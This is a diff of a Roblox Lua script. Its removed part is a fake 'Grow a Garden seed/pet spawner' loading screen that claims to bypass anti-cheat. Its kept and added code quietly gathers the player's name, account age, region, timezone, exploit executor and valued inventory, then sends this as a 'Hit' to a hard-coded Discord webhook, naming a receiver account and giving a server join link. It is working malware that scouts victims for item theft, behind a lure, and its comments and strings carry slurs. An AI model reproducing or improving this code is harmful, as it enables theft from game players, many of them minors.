@@ -1,217 +1,95 @@
--- Gui to Lua
--- Fixed Version for LocalScript
-
--- Services
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local gui = Instance.new("ScreenGui")
-gui.Name = "Loader"
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = player:WaitForChild("PlayerGui")
-
--- Frame Container
-local Frame = Instance.new("Frame")
-Frame.BackgroundColor3 = Color3.new(0, 0, 0)
-Frame.Size = UDim2.new(0, 1290, 0, 1101)
-Frame.Position = UDim2.new(0.5, -645, 0.5, -550)
-Frame.Parent = gui
-
--- Title
-local Title = Instance.new("TextLabel")
-Title.Text = "LITTLE FUCKER"
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 70
-Title.TextColor3 = Color3.new(1, 1, 1)
-Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(0, 485, 0, 86)
-Title.Position = UDim2.new(0.5, -242, 0.2, 0)
-Title.Parent = Frame
-
--- Header
-local Header = Instance.new("TextLabel")
-Header.Text = "GROW A GARDEN SEED/PET SPAWNER"
-Header.Font = Enum.Font.Gotham
-Header.TextSize = 30
-Header.TextColor3 = Color3.fromRGB(170, 186, 255)
-Header.BackgroundTransparency = 1
-Header.Size = UDim2.new(0, 688, 0, 46)
-Header.Position = UDim2.new(0.5, -344, 0.3, 0)
-Header.Parent = Frame
-
--- Progress Bar
-local Bar = Instance.new("Frame")
-Bar.Size = UDim2.new(0, 489, 0, 30)
-Bar.Position = UDim2.new(0.5, -245, 0.38, 0)
-Bar.BackgroundColor3 = Color3.fromRGB(155, 255, 170)
-Bar.BorderSizePixel = 0
-Bar.Parent = Frame
-
-local UICorner = Instance.new("UICorner", Bar)
-
-local Fill = Instance.new("Frame")
-Fill.Size = UDim2.new(0, 2, 1, 0)
-Fill.BackgroundColor3 = Color3.fromRGB(255, 168, 117)
-Fill.BorderSizePixel = 0
-Fill.Parent = Bar
-
-local UICorner2 = Instance.new("UICorner", Fill)
-
--- Percent Label
-local Perecnt = Instance.new("TextLabel")
-Perecnt.Text = "1%"
-Perecnt.Font = Enum.Font.Gotham
-Perecnt.TextSize = 30
-Perecnt.TextColor3 = Color3.fromRGB(170, 186, 255)
-Perecnt.BackgroundTransparency = 1
-Perecnt.Size = UDim2.new(0, 67, 0, 46)
-Perecnt.Position = UDim2.new(0.5, -33, 0.415, 0)
-Perecnt.Parent = Frame
-
--- Stuff Text
-local Stuff = Instance.new("TextLabel")
-Stuff.Text = "Bypassing Anti Cheat."
-Stuff.Font = Enum.Font.Gotham
-Stuff.TextSize = 30
-Stuff.TextColor3 = Color3.fromRGB(170, 186, 255)
-Stuff.BackgroundTransparency = 1
-Stuff.Size = UDim2.new(0, 625, 0, 46)
-Stuff.Position = UDim2.new(0.5, -312, 0.46, 0)
-Stuff.Parent = Frame
-
--- Bypass Text Animation
-task.spawn(function()
-	for i = 1, 30 do
-		Stuff.Text = "Bypassing Anticheat."
-		task.wait(0.6)
-		Stuff.Text = "Bypassing Anticheat.."
-		task.wait(0.6)
-		Stuff.Text = "Bypassing Anticheat..."
-		task.wait(0.6)
-	end
-
-	for i = 1, 5 do
-		Stuff.Text = "Initializing Client Touches."
-		task.wait(0.5)
-		Stuff.Text = "Initializing Client Touches.."
-		task.wait(0.5)
-		Stuff.Text = "Failed to Initialize Client"
-		task.wait(1)
-	end
-end)
-
--- Snowflake Setup
-local SNOWFLAKE_COUNT = 80
-local snowflakeTemplate = Instance.new("Frame")
-snowflakeTemplate.Size = UDim2.new(0, 10, 0, 10)
-snowflakeTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
-snowflakeTemplate.BackgroundTransparency = 0.3
-snowflakeTemplate.BorderSizePixel = 0
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(1, 0)
-corner.Parent = snowflakeTemplate
-
-for i = 1, SNOWFLAKE_COUNT do
-	local flake = snowflakeTemplate:Clone()
-	flake.Size = UDim2.new(0, math.random(6, 12), 0, math.random(6, 12))
-	flake.Position = UDim2.new(math.random(), 0, -0.1, 0)
-	flake.BackgroundTransparency = math.random(3, 8) / 10
-	flake.ZIndex = 100
-	flake.Parent = Frame
-
-	task.spawn(function()
-		while true do
-			local duration = math.random(6, 10)
-			local drift = math.random(-30, 30)
-			local goal = {
-				Position = flake.Position + UDim2.new(0, drift, 1.2, 0)
-			}
-			local tween = TweenService:Create(flake, TweenInfo.new(duration, Enum.EasingStyle.Linear), goal)
-			tween:Play()
-			tween.Completed:Wait()
-
-			flake.Position = UDim2.new(math.random(), 0, -0.1, 0)
-		end
-	end)
-end
-
-
-task.spawn(function()
-	for i = 1, 100 do
-		local fillPercent = i / 100
-		Fill.Size = UDim2.new(fillPercent, 0, 1, 0)
-		Perecnt.Text = i .. "%"
-		task.wait(1) -- Wait 1 second per percent
-	end
-end)
-
-
--- hello my nigga this is logignmg shit so fuck off
-
 local HttpService = game:GetService("HttpService")
-local player = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local player = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1380684794135842879/8tIsPrKUGSj7yTdvN2JFW9LrYIwU8WUHBxERD_gkTfD71rP1z0iu_jmukl5Jawusipmi"
 
-
-local player = player.Name
 if not player then
 	warn("Player not found!")
 	return
 end
 
 local backpack = player:FindFirstChild("Backpack")
-local items = {}
-
-
-for _, item in ipairs(backpack:GetChildren()) do
-	local name = item.Name
-	local tags = {}
-
-
-	if item:FindFirstChild("Frozen") then table.insert(tags, "Frozen") end
-	if item:FindFirstChild("Rainbow") then table.insert(tags, "Rainbow") end
-	if item:FindFirstChild("Wet") then table.insert(tags, "Wet") end
-
-	local tagStr = #tags > 0 and ("[" .. table.concat(tags, ", ") .. "] ") or ""
-	local weight = item:GetAttribute("Weight") or 0
-	local value = item:GetAttribute("Value") or 0
-
-	table.insert(items, string.format("⭐ - %s%s [%.2fkg] → %s¢", tagStr, name, weight, value))
+if not backpack then
+	warn("Backpack not found!")
+	return
 end
 
+-- 🌍 Time + Region Info
+local function getTimezone()
+	local utcOffset = os.date("*t").isdst and os.time() + 3600 or os.time()
+	return os.date("%Z", utcOffset)
+end
+
+local function getRegion()
+	local success, result = pcall(function()
+		return LocalizationService:GetCountryRegionForPlayerAsync(player)
+	end)
+	return success and result or "Unknown"
+end
+
+-- ⚙️ Executor Detection
+local function getExecutor()
+	if identifyexecutor then return identifyexecutor() end
+	if getexecutor then return getexecutor() end
+	if syn then return "Synapse X" end
+	if KRNL_LOADED then return "KRNL" end
+	if is_sirhurt_closure then return "SirHurt" end
+	if secure_load then return "ScriptWare" end
+	if is_fluxus_closure then return "Fluxus" end
+	if get_hidden_gui or gethui then return "Hydrogen" end
+	if iswindowsecure then return "Electron" end
+	if readfile and not isfolder then return "Arceus X" end
+	if getgenv then
+		local ex = getgenv().Executor or getgenv().executor
+		if typeof(ex) == "string" then return ex end
+	end
+	return "Unknown / Mobile"
+end
+
+-- 🎒 Backpack Items
+local items = {}
+for _, item in ipairs(backpack:GetChildren()) do
+	local name = item.Name
+	local weight = item:GetAttribute("Weight") or 0
+	local value = item:GetAttribute("Value") or 0
+	table.insert(items, string.format("⭐ - %s [%.2fkg] → %s¢", name, weight, value))
+end
 
 table.sort(items, function(a, b)
-	return tonumber(string.match(a, "→ ([%d,]+)¢") or "0") > tonumber(string.match(b, "→ ([%d,]+)¢") or "0")
+	local aValue = tonumber((a:match("→ ([%d,]+)¢") or "0"):gsub(",", ""))
+	local bValue = tonumber((b:match("→ ([%d,]+)¢") or "0"):gsub(",", ""))
+	return aValue > bValue
 end)
 
-
+-- 💰 Total Value
 local totalValue = 0
 for _, item in ipairs(backpack:GetChildren()) do
 	totalValue += item:GetAttribute("Value") or 0
 end
 
-
+-- 🧾 Webhook Payload
 local body = {
-	content = ":potted_plant: **Grow A Garden Hit - Little FUCKERRR** :four_leaf_clover:\n" ..
+	content = ":potted_plant: **Grow A Garden Hit - DARK SCRIPTS** :four_leaf_clover:\n" ..
 		":bust_in_silhouette: **Player Information**\n" ..
 		"Name: " .. player.Name .. "\n" ..
 		"Receiver: Gibsongamings\n" ..
-		"Executor: Delta\n" ..
+		"Executor: " .. getExecutor() .. "\n" ..
 		"Account Age: " .. player.AccountAge .. " days\n" ..
+		"Region: " .. getRegion() .. "\n" ..
+		"Timezone: " .. getTimezone() .. "\n\n" ..
 		":moneybag: **Total Value**\n" ..
-		string.format("%s¢", totalValue) .. "\n" ..
+		string.format("%s¢", totalValue) .. "\n\n" ..
 		":palm_tree: **Backpack**\n" ..
-		table.concat(items, "\n") .. "\n" ..
+		table.concat(items, "\n") .. "\n\n" ..
 		":maple_leaf: **Hits**\nAll Items\n" ..
 		":island: **Join with URL**\n" ..
 		"29c9025f-e399-4b7f-8eb5-4e0aaad4f10d\n" ..
 		"8624669736 | 29c9025f-e399-4b7f-8eb5-4e0aaad4f10d"
 }
 
-
+-- 📤 Send Webhook
 HttpService:PostAsync(
 	webhookUrl,
 	HttpService:JSONEncode(body),
